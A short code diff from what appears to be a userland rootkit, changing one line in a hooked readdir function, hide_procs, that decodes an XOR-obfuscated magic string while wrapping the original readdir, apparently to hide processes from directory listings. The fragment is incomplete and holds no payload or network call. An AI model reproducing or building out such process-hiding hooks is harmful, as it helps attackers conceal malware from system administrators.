@@ -7,7 +7,7 @@
 struct dirent *hide_procs(DIR *dirp)
 { 
 	struct dirent *dir;
-	char *magic = strdup(MAGIC); xor(magic);
+	char *magic = strdup(MAGIC); strxor(magic);
 	while(1)
 	{ 	
 		dir = old_readdir(dirp);
